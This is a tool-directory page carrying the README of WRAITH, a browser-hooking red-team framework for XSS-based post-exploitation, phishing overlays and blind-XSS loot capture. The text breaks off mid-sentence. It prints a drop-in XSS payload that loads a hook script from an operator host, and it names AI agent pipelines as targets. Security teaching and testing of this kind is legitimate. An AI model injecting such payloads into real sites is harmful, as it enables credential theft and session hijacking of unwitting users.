@@ -1,0 +1,218 @@
+---
+title: wraith
+url: https://kitploit.com/en/tools/github/arcanum-sec/wraith
+source: Kitploit
+date: 2026-09-08
+fetch_date: 2026-09-09T06:55:08.021672
+---
+
+# wraith
+
+[Skip to content](#main-content)
+
+[![Kitploit](/_next/image?url=%2Flogo.png&w=64&q=75)KITPLOIT](/en)[Tools](/en/tools)[Blog](/en/blog)Categories
+
+EN
+
+[Submit](/en/submit)
+
+[Tools](/en/tools)[Blog](/en/blog)Categories
+
+[Submit](/en/submit)
+
+EN
+
+Hacking, PenTest, and Cybersecurity Tools for Your Security Arsenal!
+
+Kitploit is a directory of hacking, cybersecurity, and pentesting tools. Discover the latest project updates to find vulnerabilities, analyze systems, automate testing, and strengthen your security.
+
+·Analytics preferences·[Feeds](/en/feeds)·[Contact](/en/contact)·[Privacy](/en/privacy)·© 2026 Kitploit
+
+Tool Directory
+
+## Categories
+
+[View all categories](/en/categories)
+
+Loading categories
+
+wraith — Browser-hooking framework for authorized red teams and educators. Hooks browsers via XSS, provides interactive post-exploitation control, blind-XSS loot capture, social-engineering overlays, and a practice lab. | Kitploit
+
+[Tools](/en/tools)/![GitHub](/providers/github.png)GitHub/arcanum-sec/wraith
+
+![](https://assets.kitploit.com/production/public/tools/54447/69cfbba18d11e3c658d65853bfe2abf4999b74766e1acc1505d2c08dfae6da1f-display-v1.webp)
+
+[Exploitation](/en/categories/exploitation)[Phishing](/en/categories/phishing)[Web Security](/en/categories/web-security)[Penetration Testing](/en/categories/penetration-testing)[Command and Control](/en/categories/command-and-control)[Social Engineering](/en/categories/social-engineering)[Learning & Education](/en/categories/education)[Red Teaming](/en/categories/red-teaming)[Labs & Practice](/en/categories/labs-practice)
+
+![GitHub](/providers/github.png)arcanum-sec/wraith
+
+# wraith
+
+Browser-hooking framework for authorized red teams and educators. Hooks browsers via XSS, provides interactive post-exploitation control, blind-XSS loot capture, social-engineering overlays, and a practice lab.
+
+14012461 month ago![Reviewed by Kitploit](/_next/image?url=%2Fbadges%2Fkitploit_badge_reviewed_full.png&w=48&q=75)
+
+[View Repository](https://github.com/arcanum-sec/wraith)[Website](https://arcanum-sec.com)
+
+### Most Popular
+
+[View all →](/en/tools)
+
+Discover the most used tools by our community.
+
+Last 7 DaysLast 30 Days
+
+Explore all tools
+
+Browse our collection of tools
+
+[View all tools →](/en/tools)
+
+Share
+
+# WRAITH — browser hook framework
+
+**A modern, standalone browser-hooking framework for red teams, security
+researchers, and educators — a clean-room successor to BeEF and the blind-XSS
+callback tools we live in.**
+
+> **FOR AUTHORIZED SECURITY TESTING, RESEARCH & EDUCATION ONLY.** WRAITH is an
+> offensive-security tool for demonstrating and testing phishing /
+> man-in-the-browser / blind-XSS tradecraft. Only use it against systems and
+> people you have **explicit authorization** to test. You are responsible for how
+> you use it.
+
+![WRAITH operator console](https://assets.kitploit.com/production/public/readmes/54447/1d447adf73505658d217d2b0741e2c129f94aa32072b09d80897f7d3308a6928/87f980cc66f11579e0fa803e9254d3c4be9a92e3e61df2d2c59669671471ad89-display-v1.webp)
+
+---
+
+## Why we built it
+
+Over the course of our work at **Arcanum**, we kept reaching for two different
+kinds of tooling and wishing they were one thing.
+
+On one side was **BeEF** — the Browser Exploitation Framework — for the classic
+*hook a browser, then work from inside its session* workflow: keylog a fake login,
+recon the local network, push a module at a live victim. It's the tool we used to
+make man-in-the-browser real to people. But it's showing its age, big chunks of it
+are unreliable in today's browsers, and the social-engineering overlays look like
+logins from a decade ago.
+
+On the other side were our favorite **blind-XSS callback frameworks** (XSS Hunter,
+ezXSS): drop a payload into a field, and the instant it fires somewhere you can't
+see, it calls home with the loot — origin, cookies, DOM, a screenshot.
+
+What we increasingly needed — especially as more of our targets became **AI
+application ecosystems**, where untrusted text flows through agents, tool outputs,
+admin review queues, and support consoles, and *fires JavaScript in places nobody
+is watching* — was a single framework that did : the interactive,
+persistent post-exploitation control of a BeEF hook,  the fire-and-forget
+blind-XSS callback loot, in one payload that's reliable in current browsers and
+looks like today's real login screens.
+
+**both**
+
+**and**
+
+So we built **WRAITH**.
+
+## Heads up: this is a work in progress
+
+We're releasing WRAITH **early, and on purpose.** We'd rather get it into the
+hands of the people who'll actually use it — and hear what breaks — than sit on it
+until it's "done."
+
+That means: **expect rough edges and bugs.** Some modules are more battle-tested
+than others, browser behavior shifts under us constantly (see the network-scan
+notes below), and APIs may change between versions. If you hit something, please
+[open an issue](https://github.com/Arcanum-Sec/wraith/issues) — repro steps,
+browser + version, and what you expected are gold. PRs welcome under the project's
+[contribution terms](#license--attribution).
+
+---
+
+## Quick start (Docker)
+
+The fastest path. You need Docker + Docker Compose.
+
+root@kitploit:~
+
+```
+git clone https://github.com/Arcanum-Sec/wraith
+cd wraith
+./setup.sh
+```
+
+`setup.sh` walks you through everything:
+
+1. **Detects your public IP** (or lets you enter a domain / custom host) so every
+   hook and payload URL is minted with *your* address.
+2. Has you **set an operator username + password** for the console login.
+3. Generates the session-signing secret, writes a gitignored `.env` (chmod 600),
+   and **builds + starts the container**.
+4. Prints your live URLs and a **drop-in XSS payload** at the end:
+
+root@kitploit:~
+
+```
+  Operator console : http://YOUR_IP:8090/operator/
+  Login page       : http://YOUR_IP:8090/login   (user "operator")
+  Demo victim page : http://YOUR_IP:8090/demo/
+  Hook payload     : http://YOUR_IP:8090/hook.js
+
+  Drop-in XSS payload:
+    "><script src="http://YOUR_IP:8090/hook.js"></script>
+```
+
+Manage it with standard compose commands:
+
+root@kitploit:~
+
+```
+docker compose logs -f      # watch it
+docker compose down         # stop (keeps ./data)
+./setup.sh                  # reconfigure (rotate password, change address, …)
+```
+
+Captured sessions persist in `./data/` on the host — **never** baked into the
+image, **never** committed (`.env` and `data/` are gitignored).
+
+The operator console is **login-gated** whenever an operator password is set, with
+a username + password sign-in:
+
+![Operator login](https://assets.kitploit.com/production/public/readmes/54447/595d49e1046347d150e9083731a7c7b053df8e14ed9db1d5f1bfa3a83ef06e9e/62fdc38e21cdf4182f3680009cc8471e0f56a7159390df596e913d555d67929f-display-v1.webp)
+
+### Run it locally without Docker (dev)
+
+root@kitploit:~
+
+```
+npm install
+npm start
+```
+
+Then open the operator console at <http://127.0.0.1:3000/operator/> and the demo
+victim page at <http://127.0.0.1:3000/demo/> (in a second browser/profile). On
+localhost, login is disabled by default for convenience — the server **refuses**
+to bind to a public interface without an operator password, so you can't
+accidentally expose an open panel.
+
+---
+
+## Features
+
+### Hook + operator console
+
+`/hook.js` is a small payload. Drop it in any page you control
+(`<script src="/hook.js"></script>`) or deliver it via an XSS in your target. The
+browser that loads it opens a WebSocket back to the operator, fingerprints itself
+(browser, OS, IP, page, UA), auto-reconnects, and survives navigation. Every
+hooked browser shows up live in the console, where you pick one and drive it — the
+full dashboard is the hero shot at the top of this README: hooked-browser roster,
+target detail, deploy controls, live activity feed, and captured credentials.
+
+### Social-engineering overlays
+
+Modernized fake-login overlays, rendered in an **isolated shadow DOM** so they
+look pixel-correct on any host page and frost-blur the page behind them like a
+real re-auth moda...
